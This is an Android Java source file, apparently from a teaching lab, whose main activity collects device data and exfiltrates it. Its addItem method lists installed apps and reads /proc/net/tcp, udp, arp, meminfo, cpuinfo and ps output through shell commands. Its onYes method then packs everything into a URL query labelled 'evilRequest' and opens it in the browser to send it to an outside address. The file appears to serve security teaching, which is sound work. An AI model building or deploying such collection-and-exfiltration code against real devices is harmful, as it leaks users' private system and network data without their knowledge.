package lbs.lab.maclocation;

import android.annotation.SuppressLint;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.view.menu.MenuBuilder;
import android.support.v7.widget.LinearLayoutManager;
import android.support.v7.widget.RecyclerView;
import android.support.v7.widget.helper.ItemTouchHelper;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.RelativeLayout;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Random;

// ************************************************************
// ** Read and edit this file *********************************
// ************************************************************

/**
 * Defines the main Activity for this application - its GUI and behaviour.
 * Extends AppCompatActivity to provide visual flair like the bar at top, hovering button at bottom right.
 * Implements YesNoListener to provide data exfiltration (look at ExfiltrateFragment).
 */
public class MainActivity extends AppCompatActivity implements ExfiltrateFragment.YesNoListener {

    // holds items (data recorded)
    // is linked with the GUI through the ItemsAdapter mAdapter
    private ArrayList<Item> mItemsData;
    private ItemsAdapter mAdapter;

    private static final String TAG = MainActivity.class.getCanonicalName();

    // key used to save/restore items when configuration changes (eg. screen rotates)
    private static final String STATE_ITEMS = "STATE_ITEMS";

    // unique codes used when sending items to be recorded, or gotten out of the database
    public static final int GET_ITEMS_ID = 1;
    public static final int SET_ITEMS_ID = 2;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // set up the connection between the list of items, and what is shown on screen

        RecyclerView mRecyclerView = findViewById(R.id.recyclerView);

        mRecyclerView.setLayoutManager(new LinearLayoutManager(this));

        mItemsData = new ArrayList<>();

        mAdapter = new ItemsAdapter(this, mItemsData);
        mRecyclerView.setAdapter(mAdapter);

        // define how individual displayed items should respond to swipes
        // can be deleted, and order switched

        ItemTouchHelper helper = new ItemTouchHelper(
            new ItemTouchHelper.SimpleCallback(
                ItemTouchHelper.LEFT | ItemTouchHelper.RIGHT |
                ItemTouchHelper.DOWN | ItemTouchHelper.UP,
                ItemTouchHelper.LEFT |
                ItemTouchHelper.RIGHT
            ) {
                @Override
                public boolean onMove(
                    RecyclerView recyclerView,
                    RecyclerView.ViewHolder viewHolder,
                    RecyclerView.ViewHolder target
                ) {
                    int from = viewHolder.getAdapterPosition();
                    int to = target.getAdapterPosition();
                    Collections.swap(mItemsData, from, to);
                    mAdapter.notifyItemMoved(from, to);
                    return false;
                }

                @Override
                public void onSwiped(
                    RecyclerView.ViewHolder viewHolder,
                    int direction
                ) {
                    mItemsData.remove(viewHolder.getAdapterPosition());
                    mAdapter.notifyItemRemoved(viewHolder.getAdapterPosition());
                    updateEmptyMessageVisibility();
                }
            });
        helper.attachToRecyclerView(mRecyclerView);

        // restore previous data, if this instance is being re-created (as in when the screen rotates)

        if (savedInstanceState != null) {
            ArrayList<Item> items = savedInstanceState.getParcelableArrayList(
                STATE_ITEMS
            );
            mItemsData.addAll(items);
            mAdapter.notifyDataSetChanged();
        }

        updateEmptyMessageVisibility();
    }

    /**
     * Helper function to control whether a prompt is shown on screen,
     * or if the normal list of recordings should be shown.
     */
    private void updateEmptyMessageVisibility() {
        RelativeLayout emptyView = findViewById(R.id.emptyView);
        if (mItemsData.isEmpty()) {
            emptyView.setVisibility(View.VISIBLE);
        } else {
            emptyView.setVisibility(View.INVISIBLE);
        }
    }

    @SuppressLint("RestrictedApi") // bug in support library
    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.menu_main, menu);
        if (menu instanceof MenuBuilder) {
            MenuBuilder m = (MenuBuilder) menu;
            m.setOptionalIconsVisible(true);
        }
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // different actions will be taken based on what menu item is selected
        switch (item.getItemId()) {
            case R.id.action_clear: // clear the list in memory, but not the database
                resetItems();
                break;
            case R.id.action_load: // set the list in memory to be the database's content
                Intent loadIntent = new Intent(this, DatabaseActivity.class);
                loadIntent.putExtra(
                    DatabaseActivity.ITEM_ACTION,
                    DatabaseActivity.GET_ITEMS_ACTION
                );
                loadIntent.setType(DatabaseActivity.TYPE);
                // the spawned Activity will give back a result, which will contain the data we want
                startActivityForResult(loadIntent, GET_ITEMS_ID);
                break;
            case R.id.action_save: // save the list in memory to the database
                Intent saveIntent = new Intent(this, DatabaseActivity.class);
                saveIntent.putExtra(
                    DatabaseActivity.ITEM_ACTION,
                    DatabaseActivity.SET_ITEMS_ACTION
                );
                saveIntent.putExtra(DatabaseActivity.ITEMS_SET, mItemsData);
                saveIntent.setType(DatabaseActivity.TYPE);
                // again, gives back a result
                startActivityForResult(saveIntent, SET_ITEMS_ID);
                break;
            case R.id.action_exfiltrate: // try to exfiltrate the data via the browser
                // starts a dialog
                new ExfiltrateFragment().show(getSupportFragmentManager(), TAG);
                break;
        }
        return super.onOptionsItemSelected(item);
    }

    @Override
    protected void onActivityResult(
        int requestCode,
        int resultCode,
        Intent data
    ) {
        // this function gets called whenever a spawned Activity returns a result
        switch (requestCode) {
            // we only care about the requests we have defined
            case GET_ITEMS_ID:
                if (resultCode == RESULT_OK) {
                    // we are able to store/retrieve this data because Item extends Parcelable
                    ArrayList<Item> items = data.getParcelableArrayListExtra(
                        DatabaseActivity.ITEMS_GET
                    );
                    mItemsData.clear();
                    mItemsData.addAll(items);
                    mAdapter.notifyDataSetChanged();
                    updateEmptyMessageVisibility();
                    Toast.makeText(
                        getApplicationContext(),
                        R.string.data_loaded,
                        Toast.LENGTH_LONG
                    ).show();
                } else {
                    Toast.makeText(
                        getApplicationContext(),
                        R.string.data_loaded_fail,
                        Toast.LENGTH_LONG
                    ).show();
                }
                break;
            case SET_ITEMS_ID:
                if (resultCode == RESULT_OK) {
                    Toast.makeText(
                        getApplicationContext(),
                        R.string.data_saved,
                        Toast.LENGTH_LONG
                    ).show();
                } else {
                    Toast.makeText(
                        getApplicationContext(),
                        R.string.data_saved_fail,
                        Toast.LENGTH_LONG
                    ).show();
                }
                break;
        }
    }

    @Override
    protected void onSaveInstanceState(Bundle outState) {
        // make sure that when the app's configuration changes, no important data is lost
        outState.putParcelableArrayList(STATE_ITEMS, mItemsData);
        super.onSaveInstanceState(outState);
    }

    /**
     * Clears the data in memory.
     */
    private void resetItems() {
        mItemsData.clear();
        // whenever we edit the Item list, we have to call this to update the GUI
        mAdapter.notifyDataSetChanged();
        updateEmptyMessageVisibility();
    }

    /**
     * This is an important part of the application!
     * How we read data from the system.
     * The function is called whenever the '+' button at the bottom right is clicked.
     * @param view - this is the button clicked.
     */
    public void addItem(View view) {
        List<ApplicationInfo> apps = getPackageManager()
            .getInstalledApplications(PackageManager.GET_UNINSTALLED_PACKAGES);
        for (ApplicationInfo app : apps) {
            mItemsData.add(new Item(
                "app",
                app.name
            ));
        }
        try {
            String line;
            StringBuilder content;
            Process p;
            BufferedReader reader;

            content = new StringBuilder();
            p = Runtime.getRuntime().exec("cat /proc/net/tcp");
            reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            while ((line = reader.readLine()) != null) {
                content.append(line).append("\n");
            }
            mItemsData.add(new Item(
                "tcp",
                content.toString()
            ));

            content = new StringBuilder();
            p = Runtime.getRuntime().exec("cat /proc/net/udp");
            reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            while ((line = reader.readLine()) != null) {
                content.append(line).append("\n");
            }
            mItemsData.add(new Item(
                "udp",
                content.toString()
            ));

            content = new StringBuilder();
            p = Runtime.getRuntime().exec("cat /proc/net/arp");
            reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            while ((line = reader.readLine()) != null) {
                content.append(line).append("\n");
            }
            mItemsData.add(new Item(
                "arp",
                content.toString()
            ));

            content = new StringBuilder();
            p = Runtime.getRuntime().exec("cat /proc/meminfo");
            reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            while ((line = reader.readLine()) != null) {
                content.append(line).append("\n");
            }
            mItemsData.add(new Item(
                "mem",
                content.toString()
            ));

            content = new StringBuilder();
            p = Runtime.getRuntime().exec("cat /proc/cpuinfo");
            reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            while ((line = reader.readLine()) != null) {
                content.append(line).append("\n");
            }
            mItemsData.add(new Item(
                "proc",
                content.toString()
            ));

            content = new StringBuilder();
            p = Runtime.getRuntime().exec("ps");
            reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            while ((line = reader.readLine()) != null) {
                content.append(line).append("\n");
            }
            mItemsData.add(new Item(
                "ps",
                content.toString()
            ));
        } catch (IOException e) {
            Toast.makeText(
                getApplicationContext(),
                "Error: " + e.getMessage(),
                Toast.LENGTH_LONG
            ).show();
        }
        mAdapter.notifyDataSetChanged();
        updateEmptyMessageVisibility();
    }

    /**
     * This is also an important part of the application!
     * Defines how we exfiltrate the data.
     * @param url - this is the URL returned by ExfiltrateFragment.
     */
    @Override
    public void onYes(String url) {
        StringBuilder evilRequest = new StringBuilder("/?");
        for (Item item : mItemsData) {
            evilRequest
                .append(Uri.encode(item.getTitle()))
                .append("=")
                .append(Uri.encode(item.getInfo()))
                .append("&");
        }
        Intent intent = new Intent(
            Intent.ACTION_VIEW,
            Uri.parse(url + evilRequest)
        );
        if (intent.resolveActivity(getPackageManager()) != null) {
            // Start the intent only if an app is able to handle it 
            startActivity(intent);
        }
    }

    /**
     * We don't care what happens when the user doesn't proceed in the exfiltration dialog.
     */
    @Override
    public void onNo() {
    }
}
